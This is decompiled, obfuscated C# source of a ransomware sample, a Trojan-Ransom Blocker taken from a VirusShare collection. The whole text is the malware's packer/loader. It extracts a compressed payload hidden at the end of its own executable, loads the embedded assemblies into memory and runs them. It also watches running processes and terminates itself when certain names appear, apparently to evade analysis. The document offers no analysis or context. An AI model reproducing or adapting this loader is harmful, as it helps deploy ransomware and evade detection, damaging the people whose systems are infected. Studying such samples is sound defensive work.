// Decompiled with JetBrains decompiler
// Type: .
// Assembly: Server.packed, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 712FD340-1A8D-4ADA-8620-0D072E5BB482
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00080-msil\Trojan-Ransom.Win32.Blocker.bipa-183abe361833d2ddb4e38325acbbb19715b5270dec52a0eb9bb6b99cfb8f1470.exe

using SmartAssembly.MemoryManagement;
using System;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;

namespace \u0002
{
  internal sealed class \u0002
  {
    public static \u0002.\u0002.\u0002 \u0001;
    public static string[] \u0001;
    public static MemoryStream[] \u0001;
    public static string[] \u0002;
    public static string[] \u0003;
    public static bool \u0001;

    static \u0002()
    {
      \u0004.\u0001.\u0001();
      \u0002.\u0002.\u0001 = false;
    }

    private static unsafe long \u0001([In] Stream obj0)
    {
      int num1;
      if (true)
        num1 = 16;
      else
        goto label_4;
label_2:
      // ISSUE: untyped stack allocation
      void* voidPtr = (void*) __untypedstackalloc(num1);
      goto label_15;
label_4:
      // ISSUE: method reference
      RuntimeMethodHandle runtimeMethodHandle = __methodref (\u0002.\u0002.\u0001);
      int num2 = 2;
      int num3;
      if (num2 != 0)
      {
        num3 = num2;
        goto label_13;
      }
label_8:
      num3 = num2;
label_13:
      int num4;
      while (true)
      {
        do
        {
          num1 = num3;
          if (true)
          {
            switch (num1)
            {
              case 1:
                if (false)
                  goto case 4;
                else
                  goto label_12;
              case 2:
                goto label_15;
              case 4:
                continue;
              case 5:
              case 7:
                goto label_7;
              case 6:
                goto label_16;
              case 8:
                goto label_5;
              default:
                goto label_4;
            }
          }
          else
            goto label_2;
        }
        while (false);
        goto label_10;
label_5:
        num4 = 5;
        if (num4 != 0)
        {
          num3 = num4;
          continue;
        }
        goto label_17;
label_10:
        num3 = *(int*) ((IntPtr) voidPtr + 8) < 8 ? 6 : 1;
        continue;
label_16:
        *(int*) ((IntPtr) voidPtr + 12) = \u0003.\u0003.\u0001(obj0, 47, 30);
        *(long*) voidPtr = *(long*) voidPtr | (long) (byte) *(int*) ((IntPtr) voidPtr + 12) << 8 * *(int*) ((IntPtr) voidPtr + 8);
        goto label_5;
      }
label_7:
      *(int*) ((IntPtr) voidPtr + 8) = *(int*) ((IntPtr) voidPtr + 8) + 1;
      num2 = 4;
      goto label_8;
label_17:
      num2 = num4;
      goto label_8;
label_12:
      return *(long*) voidPtr;
label_15:
      *(long*) voidPtr = 0L;
      *(int*) ((IntPtr) voidPtr + 8) = 0;
      num3 = 4;
      goto label_13;
    }

    private static \u0002.\u0002.\u0002 \u0001([In] MemoryStream obj0)
    {
label_2:
      byte[] numArray = new byte[\u0003.\u0003.\u0001(typeof (\u0002.\u0002.\u0002), 999, 1011)];
      \u0003\u2002.\u0001((Stream) obj0, numArray, 0, \u0003.\u0003.\u0001(typeof (\u0002.\u0002.\u0002), 52, 32), 214, 188);
      int num = 3;
      GCHandle gcHandle;
      \u0002.\u0002.\u0002 structure;
      while (true)
      {
        switch (num)
        {
          case 0:
          case 1:
          case 4:
            goto label_2;
          case 2:
            goto label_4;
          case 3:
          case 5:
            gcHandle = \u000E.Ⴄ((object) numArray, GCHandleType.Pinned, 565, 520);
            structure = (\u0002.\u0002.\u0002) Marshal.PtrToStructure(gcHandle.AddrOfPinnedObject(), typeof (\u0002.\u0002.\u0002));
            num = 2;
            continue;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (\u0002.\u0002.\u0001);
            num = 1;
            continue;
        }
      }
label_4:
      gcHandle.Free();
      return structure;
    }

    private static \u0002.\u0002.\u0001 \u0001(
      [In] MemoryStream obj0,
      [In] int obj1,
      [In] ref string obj2,
      [In] ref MemoryStream obj3)
    {
label_2:
      byte[] numArray = new byte[\u0003.\u0003.\u0001(typeof (\u0002.\u0002.\u0001), 163, 183)];
      \u0003.\u0003.\u0001((Stream) obj0, (long) obj1, SeekOrigin.Begin, 1012, 911);
      int num = 11;
      GCHandle gcHandle;
      \u0002.\u0002.\u0001 obj;
      byte[] bytes;
      byte[] buffer;
      while (true)
      {
        switch (num)
        {
          case 0:
          case 6:
            num = 2;
            continue;
          case 2:
            \u0003\u2002.\u0001((Stream) obj0, bytes, 0, obj.\u0004, 117, 31);
            num = 9;
            continue;
          case 3:
            goto label_2;
          case 4:
            \u000E.Ⴐ(ref gcHandle, 862, 888);
            bytes = new byte[obj.\u0004];
            \u0003.\u0003.\u0001((Stream) obj0, (long) obj.\u0003, SeekOrigin.Begin, 442, 449);
            goto case 0;
          case 5:
            goto label_11;
          case 7:
            obj0.Seek((long) obj.\u0001, SeekOrigin.Begin);
            obj0.Read(buffer, 0, obj.\u0002);
            num = 5;
            continue;
          case 8:
            num = 7;
            continue;
          case 9:
            obj2 = global::\u0003.Ⴃ(882, 813).GetString(bytes);
            buffer = new byte[obj.\u0002];
            goto case 8;
          case 10:
            gcHandle = \u000E.Ⴄ((object) numArray, GCHandleType.Pinned, 338, 367);
            obj = (\u0002.\u0002.\u0001) \u0003.\u0003.\u0001(\u000E.Ⴀ(ref gcHandle, 654, 751), typeof (\u0002.\u0002.\u0001), 76, 65);
            num = 4;
            continue;
          case 11:
            \u0003\u2002.\u0001((Stream) obj0, numArray, 0, \u0003.\u0003.\u0001(typeof (\u0002.\u0002.\u0001), 731, 719), 600, 562);
            num = 10;
            continue;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (\u0002.\u0002.\u0001);
            num = 3;
            continue;
        }
      }
label_11:
      obj3.Write(buffer, 0, obj.\u0002);
      return obj;
    }

    private static string \u0001([In] MemoryStream obj0, [In] int obj1, [In] int obj2)
    {
      if (false)
        goto label_8;
      else
        goto label_13;
label_4:
      int length;
      byte[] bytes = new byte[length];
      \u0003.\u0003.\u0001((Stream) obj0, (long) obj1, SeekOrigin.Begin, 839, 828);
label_5:
      int num1 = 3;
      goto label_11;
label_8:
      length = 6;
      if (length != 0)
        num1 = length;
      else
        goto label_4;
label_11:
      while (true)
      {
        do
        {
          switch (num1)
          {
            case 0:
              goto label_5;
            case 3:
              goto label_14;
            case 4:
            case 5:
              goto label_13;
            case 6:
              goto label_10;
            default:
              continue;
          }
        }
        while (false);
        // ISSUE: method reference
        RuntimeMethodHandle runtimeMethodHandle = __methodref (\u0002.\u0002.\u0001);
        int num2 = 4;
label_3:
        if (num2 != 0)
        {
          num1 = num2;
          continue;
        }
label_6:
        if (false)
          goto label_3;
        else
          break;
label_14:
        num2 = \u0003\u2002.\u0001((Stream) obj0, bytes, 0, obj2, 487, 397);
        goto label_6;
      }
      string str = Encoding.UTF8.GetString(bytes);
      goto label_8;
label_10:
      return str;
label_13:
      length = obj2;
      goto label_4;
    }

    private static Assembly \u0001([In] object obj0, [In] ResolveEventArgs obj1)
    {
label_21:
      string str = \u0005\u2000.\u0001(\u0003.\u0003.\u0001(new AssemblyName(\u0006.Ⴐ(obj1, 743, 730)), 369, 306), \u0004.\u0001.\u0001(623032973, 7), 91, 62);
      int num1 = 0;
      while (true)
      {
        int num2;
        while (true)
        {
          int index;
          int num3;
          switch (num1)
          {
            case 0:
            case 8:
              index = 1;
              goto case 10;
            case 1:
label_12:
              return Assembly.Load(global::\u0003.Ⴓ(\u0002.\u0002.\u0001[index], 457, 489));
            case 2:
            case 5:
              num3 = index;
              goto label_14;
            case 4:
              if (true)
              {
                num3 = \u000E.Ⴈ(\u0002.\u0002.\u0001[index], str, true, 618, 549);
                break;
              }
              goto case 10;
            case 6:
              goto label_21;
            case 7:
              num1 = index < \u0002.\u0002.\u0001.\u0001 ? 4 : 9;
              continue;
            case 9:
              return (Assembly) null;
            case 10:
              if (true)
              {
                num1 = 7;
                continue;
              }
              goto label_16;
            default:
              // ISSUE: method reference
              RuntimeMethodHandle runtimeMethodHandle = __methodref (\u0002.\u0002.\u0001);
              num1 = 6;
              continue;
          }
label_8:
          if (num3 == 0)
          {
            num2 = 1;
            goto label_10;
          }
          else
            break;
label_14:
          if (true)
            index = num3 + 1;
          else
            goto label_8;
label_16:
          num3 = 7;
          if (num3 != 0)
          {
            num1 = num3;
            if (false)
              goto label_12;
          }
          else
            goto label_14;
        }
        goto label_11;
label_10:
        num1 = num2;
        continue;
label_11:
        num2 = 2;
        goto label_10;
      }
    }

    public static bool \u0001([In] string obj0, [In] string obj1)
    {
label_17:
      int num1;
      switch (obj0)
      {
        case null:
label_6:
          num1 = 4;
          break;
        default:
          num1 = 5;
          break;
      }
      int num2 = num1;
      Regex regex;
      while (true)
      {
        do
        {
          switch (num2)
          {
            case 0:
              goto label_17;
            case 1:
              goto label_21;
            case 2:
              goto label_14;
            case 3:
              goto label_15;
            case 4:
              goto label_11;
            case 5:
            case 7:
              goto label_19;
            default:
              // ISSUE: method reference
              RuntimeMethodHandle runtimeMethodHandle = __methodref (\u0002.\u0002.\u0001);
              if (true)
                num2 = 0;
              if (true)
                continue;
              goto label_15;
          }
        }
        while (false);
        continue;
label_9:
        int num3;
        if (true)
        {
          num3 = 1;
          goto label_20;
        }
        else
          goto label_6;
label_11:
        if (false)
          goto label_9;
        else
          break;
label_14:
        num2 = 3;
        continue;
label_19:
        if (\u0001.\u0003.\u0001(obj0, 740, 693) == 0)
          num3 = 4;
        else
          goto label_9;
label_20:
        num2 = num3;
        continue;
label_21:
        regex = new Regex(\u0005\u2000.\u0001(\u0005\u2000.\u0001(obj1, \u0004.\u0001.\u0001(623032965, 6), \u0004.\u0001.\u0001(623032962, 5), 45, 34), \u0004.\u0001.\u0001(623032988, 5), \u0004.\u0001.\u0001(623032981, 8), 278, 281).Replace('?', '.').ToLower());
        goto label_14;
      }
      return false;
label_15:
      int num4 = regex.IsMatch(obj0.ToLower()) ? 1 : 0;
      return false ? num4 != 0 : num4 != 0;
    }

    public static unsafe bool \u0001([In] string obj0, [In] string[] obj1)
    {
      int num1 = 5;
      void* voidPtr;
      while (true)
      {
        // ISSUE: untyped stack allocation
        voidPtr = (void*) __untypedstackalloc(num1);
        if (false)
          goto label_20;
        else
          goto label_18;
label_17:
        int num2;
        string[] strArray;
        int num3;
        while (true)
        {
          int num4;
          do
          {
            int num5 = num2;
            while (true)
            {
              switch (num5)
              {
                case 0:
                  *(int*) voidPtr = *(int*) voidPtr + 1;
                  num4 = 7;
                  break;
                case 2:
                  goto label_18;
                case 3:
                  goto label_6;
                case 4:
                case 8:
                  goto label_20;
                case 5:
                  goto label_16;
                case 6:
                  goto label_19;
                case 7:
                  do
                  {
                    num3 = *(int*) voidPtr;
                    if (true)
                    {
                      if (true)
                      {
                        int length = strArray.Length;
                        num2 = num3 < length ? 4 : 10;
                      }
                      else
                        goto label_4;
                    }
                    else
                      goto label_5;
                  }
                  while (false);
                  goto label_13;
label_4:
                  num4 = num3;
                  break;
                case 10:
                  goto label_15;
                default:
                  goto label_3;
              }
              if (num4 == 0)
                num5 = num4;
              else
                goto label_9;
            }
label_13:;
          }
          while (false);
          continue;
label_3:
          // ISSUE: method reference
          RuntimeMethodHandle runtimeMethodHandle = __methodref (\u0002.\u0002.\u0001);
          num2 = 2;
          continue;
label_6:
          *(sbyte*) ((IntPtr) voidPtr + 4) = (sbyte) 1;
          num2 = 5;
          continue;
label_9:
          num2 = num4;
        }
label_5:
        num1 = num3;
        continue;
label_18:
        strArray = obj1;
label_19:
        *(int*) voidPtr = 0;
        num2 = 7;
        goto label_17;
label_20:
        string str = strArray[*(int*) voidPtr];
        num2 = !\u0002.\u0002.\u0001(obj0, str) ? 0 : 3;
        goto label_17;
      }
label_15:
      return false;
label_16:
      return (bool) *(sbyte*) ((IntPtr) voidPtr + 4);
    }

    public static void \u0001()
    {
      int num1 = 2;
      while (true)
      {
        int num2 = num1;
        if (true)
        {
          switch (num2)
          {
            case 0:
              return;
            case 1:
            case 4:
              goto label_5;
            case 3:
              break;
            default:
              if (true)
              {
                global::\u0003.Ⴈ(\u0006.Ⴄ(915, 899), 845, 804);
                break;
              }
              break;
          }
        }
        else
          goto label_10;
label_9:
        Process.GetCurrentProcess().Close();
        num2 = 1;
label_10:
        num1 = num2;
        if (false)
          goto label_9;
      }
label_5:
      if (false)
        return;
      Process.GetCurrentProcess().Kill();
    }

    public static unsafe void \u0002()
    {
      int num1 = 8;
      void* voidPtr;
      if (num1 != 0)
      {
        // ISSUE: untyped stack allocation
        voidPtr = (void*) __untypedstackalloc(num1);
        goto label_23;
      }
      else
        goto label_17;
label_3:
      int num2;
      if (num2 != 0)
      {
        *(int*) ((IntPtr) voidPtr + 4) = 1;
        goto label_24;
      }
label_6:
      int num3 = 194;
      int num4 = 151;
      Process[] processArray1;
      if (num4 != 0)
      {
        Process[] processArray2 = \u000E.Ⴓ(num3, num4);
        if (true)
          processArray1 = processArray2;
        *(int*) voidPtr = 0;
      }
      else
        goto label_21;
label_7:
      int num5 = 10;
      goto label_26;
label_17:
      \u0003\u2002.\u0001(num1, 784, 875);
      *(int*) voidPtr = *(int*) voidPtr + 1;
      num2 = 10;
label_18:
      if (num2 != 0)
      {
        num5 = num2;
        goto label_26;
      }
      else
        goto label_3;
label_21:
      int num6 = num4 - 1;
      num5 = num3 < num6 ? 3 : 8;
      goto label_26;
label_23:
      *(int*) ((IntPtr) voidPtr + 4) = 4;
label_24:
      switch (*(int*) ((IntPtr) voidPtr + 4))
      {
        case 1:
          return;
        default:
          num2 = \u0002.\u0002.\u0001 ? 1 : 0;
          goto label_3;
      }
label_26:
      int num7;
      while (true)
      {
        do
        {
          switch (num5)
          {
            case 0:
            case 11:
              goto label_13;
            case 1:
              goto label_15;
            case 3:
              num7 = \u0002.\u0002.\u0001(\u0006.Ⴅ(processArray1[*(int*) voidPtr], 552, 597), \u0002.\u0002.\u0002) ? 1 : 0;
              if (true)
              {
                if (true)
                  num7 = num7 == 0 ? 9 : 11;
                else
                  goto label_4;
              }
              num5 = num7;
              continue;
            case 4:
              goto label_6;
            case 5:
              goto label_7;
            case 6:
              goto label_16;
            case 8:
              goto label_22;
            case 9:
              goto label_14;
            case 10:
              goto label_20;
            default:
              goto label_5;
          }
        }
        while (true);
        goto label_15;
label_13:
        \u0002.\u0002.\u0001();
label_14:
        num5 = !\u0002.\u0002.\u0001(\u0006.Ⴅ(processArray1[*(int*) voidPtr], 757, 651), \u0002.\u0002.\u0003) ? 6 : 1;
      }
label_5:
      // ISSUE: method reference
      RuntimeMethodHandle runtimeMethodHandle = __methodref (\u0002.\u0002.\u0002);
      return;
label_15:
      \u0002.\u0002.\u0001();
label_16:
      num1 = 100;
      goto label_17;
label_4:
      num2 = num7;
      goto label_18;
label_20:
      int num8 = *(int*) voidPtr;
      num4 = processArray1.Length;
      num3 = num8;
      goto label_21;
label_22:
      Thread.Sleep(1500);
      goto label_23;
    }

    [STAThread]
    private static unsafe void \u0001([In] string[] obj0)
    {
      // ISSUE: untyped stack allocation
      IntPtr num1 = __untypedstackalloc(24);
      void* voidPtr;
      if (true)
        voidPtr = (void*) num1;
      MemoryManager.\u0001();
      \u0004.\u0001.\u0001();
      int num2 = 4;
      while (true)
      {
        MemoryStream memoryStream1;
        byte[] numArray;
        \u0005\u2000 obj;
        MemoryStream memoryStream2;
        Assembly assembly;
        int length;
        switch (num2)
        {
          case 0:
            \u0002.\u0002.\u0003 = \u0005\u2000.\u0001(\u0002.\u0002.\u0001(memoryStream2, \u0002.\u0002.\u0001.\u0004, \u0002.\u0002.\u0001.\u0005), new char[1]
            {
              '|'
            }, 220, 225);
            num2 = 11;
            continue;
          case 1:
            \u0002.\u0002.\u0001(memoryStream2, *(int*) ((IntPtr) voidPtr + 16), ref \u0002.\u0002.\u0001[*(int*) ((IntPtr) voidPtr + 20)], ref \u0002.\u0002.\u0001[*(int*) ((IntPtr) voidPtr + 20)]);
            num2 = 20;
            continue;
          case 2:
            num2 = *(int*) ((IntPtr) voidPtr + 20) < \u0002.\u0002.\u0001.\u0001 ? 6 : 19;
            continue;
          case 3:
            num2 = !\u0002.\u0002.\u0001.\u0001 ? 5 : 7;
            continue;
          case 5:
            goto label_1;
          case 6:
          case 18:
            \u0002.\u0002.\u0001[*(int*) ((IntPtr) voidPtr + 20)] = string.Empty;
            \u0002.\u0002.\u0001[*(int*) ((IntPtr) voidPtr + 20)] = new MemoryStream();
            goto case 1;
          case 7:
            \u0002.\u0002.\u0001 = \u0002.\u0002.\u0001.\u0001;
            num2 = 5;
            continue;
          case 8:
            num2 = assembly.EntryPoint.GetParameters().Length != 0 ? 12 : 17;
            continue;
          case 9:
            \u0002.\u0002.\u0001 = new string[\u0002.\u0002.\u0001.\u0001];
            length = \u0002.\u0002.\u0001.\u0001;
            break;
          case 10:
            assembly = Assembly.Load(global::\u0003.Ⴓ(\u0002.\u0002.\u0001[0], 188, 156));
            length = (object) assembly == null ? 3 : 8;
            goto label_23;
          case 11:
            \u0005\u2000.\u0001(new Thread(new ThreadStart(\u0002.\u0002.\u0002)), 1015, 1007);
            goto case 9;
          case 12:
            assembly.EntryPoint.Invoke((object) null, new object[1]
            {
              (object) obj0
            });
            num2 = 3;
            continue;
          case 13:
            \u0002.\u0002.\u0002 = \u0005\u2000.\u0001(\u0002.\u0002.\u0001(memoryStream2, \u0002.\u0002.\u0001.\u0002, \u0002.\u0002.\u0001.\u0003), new char[1]
            {
              '|'
            }, 91, 102);
            num2 = 0;
            continue;
          case 14:
            *(long*) ((IntPtr) voidPtr + 8) = \u0002.\u0002.\u0001((Stream) memoryStream1);
            obj.\u0001((Stream) memoryStream1, (Stream) memoryStream2, *(long*) voidPtr, *(long*) ((IntPtr) voidPtr + 8), (\u0007.\u0001) null);
            num2 = 21;
            continue;
          case 15:
            obj = new \u0005\u2000();
            obj.\u0001(numArray);
            goto case 14;
          case 16:
            *(int*) ((IntPtr) voidPtr + 20) = 0;
            int num3 = 2;
            if (num3 == 0)
            {
              length = num3;
              break;
            }
            num2 = num3;
            continue;
          case 17:
            assembly.EntryPoint.Invoke((object) null, (object[]) null);
            num2 = 3;
            continue;
          case 19:
            num2 = \u0002.\u0002.\u0001.\u0001 <= 1 ? 10 : 22;
            continue;
          case 20:
            *(int*) ((IntPtr) voidPtr + 16) = *(int*) ((IntPtr) voidPtr + 16) + \u0003.\u0003.\u0001(typeof (\u0002.\u0002.\u0001), 818, 806);
            *(int*) ((IntPtr) voidPtr + 20) = *(int*) ((IntPtr) voidPtr + 20) + 1;
            num2 = 2;
            continue;
          case 21:
            \u000E.Ⴗ((Stream) memoryStream1, 772, 845);
            \u0003.\u0003.\u0001((Stream) memoryStream2, 0L, SeekOrigin.Begin, 818, 841);
            num2 = 24;
            continue;
          case 22:
            \u0006.Ⴀ(\u000E.Ⴅ(595, 567), new ResolveEventHandler(\u0002.\u0002.\u0001), 672, 705);
            goto case 10;
          case 23:
            *(long*) voidPtr = \u0002.\u0002.\u0001((Stream) memoryStream1);
            \u0003.\u0003.\u0001((Stream) memoryStream1, -*(long*) voidPtr - 8L, SeekOrigin.Current, 622, 533);
            num2 = 25;
            continue;
          case 24:
            \u0002.\u0002.\u0001 = \u0002.\u0002.\u0001(memoryStream2);
            num2 = !\u0002.\u0002.\u0001.\u0001 ? 9 : 13;
            continue;
          case 25:
            numArray = new byte[5];
            \u0003\u2002.\u0001((Stream) memoryStream1, numArray, 0, 5, 381, 279);
            num2 = 15;
            continue;
          default:
            memoryStream2 = new MemoryStream();
            memoryStream1 = new MemoryStream(\u0003\u2002.\u0001());
            \u0003.\u0003.\u0001((Stream) memoryStream1, -8L, SeekOrigin.End, 752, 651);
            num2 = 23;
            continue;
        }
        if (true)
        {
          \u0002.\u0002.\u0001 = new MemoryStream[length];
          *(int*) ((IntPtr) voidPtr + 16) = \u0003.\u0003.\u0001(typeof (\u0002.\u0002.\u0002), 281, 269);
          num2 = 16;
          continue;
        }
label_23:
        num2 = length;
      }
label_1:;
    }

    public struct \u0001
    {
      public int \u0001;
      public int \u0002;
      public int \u0003;
      public int \u0004;

      static \u0001() => \u0004.\u0001.\u0001();
    }

    public struct \u0002
    {
      public bool \u0001;
      public int \u0001;
      public int \u0002;
      public int \u0003;
      public int \u0004;
      public int \u0005;

      static \u0002() => \u0004.\u0001.\u0001();
    }
  }
}
